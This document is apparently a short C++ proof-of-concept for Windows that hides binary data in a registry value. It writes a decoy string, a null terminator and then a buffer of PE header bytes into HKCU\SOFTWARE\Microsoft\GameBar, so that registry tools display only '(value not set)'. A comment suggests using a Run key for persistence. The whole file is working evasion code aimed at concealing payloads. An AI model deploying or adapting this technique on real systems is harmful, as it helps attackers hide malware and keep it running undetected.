#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>

// prototypes
void writeHiddenBuffer(char* buf, DWORD buflen, const char* decoy, char* keyName, const char* valueName);

int main()
{
  // reg key could be Run key and the binary could be calc.exe
	char buf[] = { 0x4D, 0x5A, 0x90, 0x00 };
	auto buflen = sizeof(buf);
	char decoy[] = "(value not set)";
	
	char keyName[] = "SOFTWARE\\Microsoft\\GameBar";
	//const char valueName[] = "(Default)";
	const char valueName[] = "";

	writeHiddenBuffer(buf, sizeof(buf), decoy, keyName, valueName);

}

void writeHiddenBuffer(char* buf, DWORD buflen, const char* decoy, char* keyName, const char* valueName) {

	HKEY hkResult = NULL;
	BYTE* buf2 = (BYTE*)malloc(buflen + strlen(decoy) + 1);
	if (buf2 != NULL) {

		strcpy((char*)buf2, decoy);
		buf2[strlen(decoy)] = 0;
		memcpy(buf2 + strlen(decoy) + 1, buf, buflen);
		printf("%s", buf2);

		if (!RegOpenKeyExA(HKEY_CURRENT_USER, keyName, 0, KEY_SET_VALUE, &hkResult)) {

			printf("[+] key opened");
			LSTATUS lStatus = RegSetValueExA(hkResult, valueName, 0, REG_SZ, (const BYTE*)buf2, buflen + strlen(decoy) + 1);
			printf("%d", lStatus);
			RegCloseKey(hkResult);
		}
		else {
			printf("[-] failed to open the key");
		}
	}
}
